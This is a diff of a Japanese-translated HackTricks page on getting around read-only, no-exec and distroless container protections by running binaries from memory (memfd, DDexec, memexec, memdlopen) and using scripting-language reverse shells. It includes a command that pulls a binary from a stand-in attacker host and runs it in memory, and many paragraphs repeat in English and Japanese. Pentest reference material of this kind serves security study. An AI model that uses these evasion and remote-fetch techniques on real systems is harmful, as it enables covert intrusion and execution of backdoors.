@@ -1,17 +1,18 @@
-# FS保護のバイパス: 読み取り専用 / 実行不可 / Distroless
+# Bypass FS protections: read-only / no-exec / Distroless
 
 {{#include ../../../banners/hacktricks-training.md}}
 
+
 ## 動画
 
-以下の動画では、このページで言及されている技術がより詳しく説明されています：
+以下の動画では、このページで触れている技術がより詳細に説明されています:
 
-- [**DEF CON 31 - Linuxメモリ操作の探索：ステルスと回避**](https://www.youtube.com/watch?v=poHirez8jk4)
-- [**DDexec-ngとメモリ内dlopen()によるステルス侵入 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)
+- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
+- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)
 
-## 読み取り専用 / 実行不可シナリオ
+## read-only / no-exec シナリオ
 
-Linuxマシンが**読み取り専用 (ro) ファイルシステム保護**でマウントされていることがますます一般的になっています。特にコンテナでは、**`readOnlyRootFilesystem: true`**を`securitycontext`に設定するだけで、roファイルシステムでコンテナを実行することができます：
+コンテナ内では特に、Linux マシンが **read-only (ro) file system protection** でマウントされているケースが増えています。これは、コンテナを ro ファイルシステムで実行するのが `securitycontext` に **`readOnlyRootFilesystem: true`** を設定するだけで簡単にできるためです:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
@@ -26,40 +27,40 @@ securityContext:
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-しかし、ファイルシステムがroとしてマウントされていても、**`/dev/shm`**は書き込み可能であるため、ディスクに何も書き込めないというのは偽りです。ただし、このフォルダは**実行不可保護**でマウントされるため、ここにバイナリをダウンロードしても**実行することはできません**。
+とはいえ、ファイルシステムが ro でマウントされていても **`/dev/shm`** は引き続き書き込み可能なので、「ディスクに何も書き込めない」というのは正確ではありません。ただし、このフォルダは **no-exec 保護でマウントされる**ため、ここにバイナリをダウンロードしても **実行することはできません**。
 
 > [!WARNING]
-> レッドチームの観点から見ると、これは**システムに既に存在しない**バイナリ（バックドアや`kubectl`のような列挙ツール）をダウンロードして実行することを**複雑にします**。
+> red team の観点では、これはシステムに既に存在しないバイナリ（backdoors や `kubectl` のような列挙ツールなど）を **ダウンロードして実行する**ことを非常に複雑にします。
 
-## 最も簡単なバイパス: スクリプト
+## Easiest bypass: Scripts
 
-バイナリについて言及しましたが、インタープリタがマシン内にある限り、**任意のスクリプトを実行することができます**。例えば、`sh`が存在する場合は**シェルスクリプト**、`python`がインストールされている場合は**Pythonスクリプト**です。
+ここまでバイナリの話をしてきましたが、マシン内にインタプリタがあれば任意のスクリプトは **実行可能**です。例えば `sh` があれば **shell script** を、`python` があれば **python script** を実行できます。
 
-しかし、これはあなたのバイナリバックドアや他のバイナリツールを実行するには十分ではありません。
+しかし、これだけではバイナリの backdoor や他のバイナリツールを実行するには不十分な場合があります。
 
-## メモリバイパス
+## Memory Bypasses
 
-バイナリを実行したいがファイルシステムがそれを許可していない場合、最良の方法は**メモリから実行すること**です。なぜなら、**保護はそこには適用されないからです**。
+ファイルシステムがバイナリの実行を許さない場合、最良の方法はそれを **memory から実行する**ことです。なぜならこれらの保護はメモリ上には適用されないからです。
 
-### FD + execシステムコールバイパス
+### FD + exec syscall bypass
 
-マシン内に**Python**、**Perl**、または**Ruby**のような強力なスクリプトエンジンがある場合、メモリから実行するためにバイナリをダウンロードし、メモリファイルディスクリプタ（`create_memfd`システムコール）に保存することができます。これはこれらの保護によって保護されないため、**`exec`システムコール**を呼び出して**実行するファイルとしてfdを指定**します。
+マシン内に Python、Perl、Ruby のような強力なスクリプトエンジンがある場合、バイナリをメモリから実行するためにダウンロードし、memory file descriptor（`create_memfd` syscall）に格納してから **`exec` syscall** を呼び出し、**fd を実行するファイルとして指定**することができます。
 
-これには、プロジェクト[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec)を簡単に使用できます。バイナリを渡すと、**バイナリが圧縮され、b64エンコードされた**スクリプトを指定された言語で生成し、`create_memfd`システムコールを呼び出して作成された**fd**で**デコードおよび解凍する**手順と、実行するための**exec**システムコールを呼び出します。
+この用途にはプロジェクト [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) を簡単に使えます。バイナリを渡すと、指定した言語のスクリプトを生成し、**binary を圧縮して b64 エンコード**し、`create_memfd` syscall で作成した **fd** に **デコードと展開**を行って格納し、最後に **exec** syscall を呼んで実行する手順を組み込みます。
 
 > [!WARNING]
-> これはPHPやNodeのような他のスクリプト言語では機能しません。なぜなら、スクリプトから生のシステムコールを呼び出す**デフォルトの方法がないからです**。したがって、バイナリを保存するための**メモリfd**を作成するために`create_memfd`を呼び出すことはできません。
+> これは PHP や Node のような他のスクリプト言語では動作しません。これらはスクリプトから生の syscall を呼ぶ**デフォルトの方法**を持っていないため、`create_memfd` を呼んで **memory fd** を作成することができないからです。
 >
-> さらに、`/dev/shm`にファイルを持つ**通常のfd**を作成しても機能しません。なぜなら、**実行不可保護**が適用されるため、実行することは許可されないからです。
+> さらに、`/dev/shm` にファイルを置いて通常の fd を作成しても、no-exec 保護が適用されるため実行はできません。
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)は、プロセスの**`/proc/self/mem`**を上書きすることによって**自分のプロセスのメモリを変更する**技術です。
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) は、自プロセスの **`/proc/self/mem`** を上書きすることでプロセスのメモリを変更できる技術です。
 
-したがって、プロセスによって実行されているアセンブリコードを**制御することができ**、**シェルコード**を書き込み、プロセスを「変異」させて**任意のコードを実行する**ことができます。
+したがって、プロセスで実行されているアセンブリコードを**制御**することで、**shellcode** を書き込み、プロセスを「変異」させて **任意のコードを実行**させることができます。
 
 > [!TIP]
-> **DDexec / EverythingExec**を使用すると、**メモリ**から自分の**シェルコード**や**任意のバイナリ**を**ロードして実行**することができます。
+> **DDexec / EverythingExec** により、独自の **shellcode** や **any binary** を **memory** からロードして **execute** することが可能になります。
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
@@ -73,40 +74,71 @@ ddexec.md
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) は DDexec の自然な次のステップです。これは **DDexec シェルコードのデーモン化** であり、異なるバイナリを **実行したいとき** に DDexec を再起動する必要はなく、DDexec テクニックを介して memexec シェルコードを実行し、その後 **このデーモンと通信して新しいバイナリを読み込んで実行する** ことができます。
+[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. It's a **DDexec shellcode demonised**, so every time that you want to **run a different binary** you don't need to relaunch DDexec, you can just run memexec shellcode via the DDexec technique and then **communicate with this deamon to pass new binaries to load and run**.
 
-**memexec を使用して PHP リバースシェルからバイナリを実行する方法の例** は [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) で見つけることができます。
+[**Memexec**](https://github.com/arget13/memexec) は DDexec の自然な次のステップです。これは **DDexec shellcode demonised** で、別のバイナリを実行したいたびに DDexec を再起動する必要がなく、DDexec テクニック経由で memexec の shellcode を実行し、その deamon と通信してロード・実行する新しいバイナリを渡すことができます。
+
+You can find an example on how to use **memexec to execute binaries from a PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
 
 ### Memdlopen
 
-DDexec と同様の目的を持つ [**memdlopen**](https://github.com/arget13/memdlopen) テクニックは、**メモリにバイナリを読み込む** より簡単な方法を提供します。依存関係を持つバイナリを読み込むことさえ可能です。
+With a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) technique allows an **easier way to load binaries** in memory to later execute them. It could allow even to load binaries with dependencies.
+
+DDexec と同様の目的で、[**memdlopen**](https://github.com/arget13/memdlopen) テクニックはバイナリをメモリに読み込んで後で実行するための、より簡単な方法を提供します。依存関係を持つバイナリの読み込みすら可能にする場合があります。
 
 ## Distroless Bypass
 
+For a dedicated explanation of **what distroless actually is**, when it helps, when it does not, and how it changes post-exploitation tradecraft in containers, check:
+
+{{#ref}}
+../../privilege-escalation/container-security/distroless.md
+{{#endref}}
+
 ### What is distroless
 
-Distroless コンテナは、特定のアプリケーションやサービスを実行するために必要な **最小限のコンポーネント** のみを含み、ライブラリやランタイム依存関係などを含みますが、パッケージマネージャー、シェル、システムユーティリティなどの大きなコンポーネントは除外されます。
+Distroless containers contain only the **bare minimum components necessary to run a specific application or service**, such as libraries and runtime dependencies, but exclude larger components like a package manager, shell, or system utilities.
 
-Distroless コンテナの目的は、**不要なコンポーネントを排除することによってコンテナの攻撃面を減少させ**、悪用される可能性のある脆弱性の数を最小限に抑えることです。
+The goal of distroless containers is to **reduce the attack surface of containers by eliminating unnecessary components** and minimising the number of vulnerabilities that can be exploited.
+
+Distroless コンテナは、ライブラリやランタイム依存関係のような特定のアプリケーションやサービスを実行するために必要な最小限のコンポーネントのみを含み、package manager、shell、system utilities のような大きなコンポーネントは除外します。
+
+Distroless コンテナの目的は、不要なコンポーネントを排除してコンテナの攻撃対象領域を削減し、悪用可能な脆弱性の数を最小限にすることです。
 
 ### Reverse Shell
 
-Distroless コンテナでは、通常のシェルを取得するための `sh` や `bash` を **見つけられない** かもしれません。また、`ls`、`whoami`、`id` などのバイナリも見つかりません... システムで通常実行するすべてのものです。
+In a distroless container you might **not even find `sh` or `bash`** to get a regular shell. You won't also find binaries such as `ls`, `whoami`, `id`... everything that you usually run in a system.
+
+distroless コンテナでは、通常のシェルを得るための `sh` や `bash` すら見つからないことがあります。また、`ls`、`whoami`、`id` のようなバイナリも見つからず、通常システム上で実行するものは一切ありません。
 
 > [!WARNING]
-> したがって、**リバースシェル** を取得したり、通常のように **システムを列挙** することは **できません**。
+> Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.
 
-ただし、侵害されたコンテナが例えば Flask ウェブを実行している場合、Python がインストールされているため、**Python リバースシェル** を取得できます。Node を実行している場合は Node リバースシェルを取得でき、ほとんどの **スクリプト言語** でも同様です。
+> [!WARNING]
+> したがって、通常のように **reverse shell** を取得したり、システムを **enumerate** することはできません。
+
+However, if the compromised container is running for example a flask web, then python is installed, and therefore you can grab a **Python reverse shell**. If it's running node, you can grab a Node rev shell, and the same with mostly any **scripting language**.
+
+ただし、例えば侵害されたコンテナが flask ウェブを実行している場合は python がインストールされているため、**Python reverse shell** を取得できます。node を実行している場合は Node rev shell を取得でき、ほとんどの **scripting language** でも同様です。
 
 > [!TIP]
-> スクリプト言語を使用することで、言語の機能を利用して **システムを列挙** することができます。
-
-**read-only/no-exec** 保護が **ない** 場合、リバースシェルを悪用して **ファイルシステムにバイナリを書き込み**、それらを **実行** することができます。
+> Using the scripting language you could **enumerate the system** using the language capabilities.
 
 > [!TIP]
-> ただし、この種のコンテナでは通常これらの保護が存在しますが、**以前のメモリ実行テクニックを使用してそれらを回避する** ことができます。
+> スクリプト言語を使えば、その言語の機能でシステムを **enumerate** することが可能です。
 
-**RCE 脆弱性を悪用してスクリプト言語のリバースシェルを取得し、メモリからバイナリを実行する方法の例** は [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) で見つけることができます。
+If there is **no `read-only/no-exec`** protections you could abuse your reverse shell to **write in the file system your binaries** and **execute** them.
+
+もし **`read-only/no-exec`** 保護が無ければ、reverse shell を悪用してファイルシステムにバイナリを書き込み、それらを **execute** することができます。
+
+> [!TIP]
+> However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.
+
+> [!TIP]
+> ただし、この種のコンテナでは通常これらの保護が存在しますが、**previous memory execution techniques を使ってそれらをバイパス** することができます。
+
+You can find **examples** on how to **exploit some RCE vulnerabilities** to get scripting languages **reverse shells** and execute binaries from memory in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+
+スクリプト言語の **reverse shells** を取得し、メモリからバイナリを実行するためにいくつかの RCE 脆弱性を **exploit** する方法の **examples** は [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) にあります。
 
 
 {{#include ../../../banners/hacktricks-training.md}}
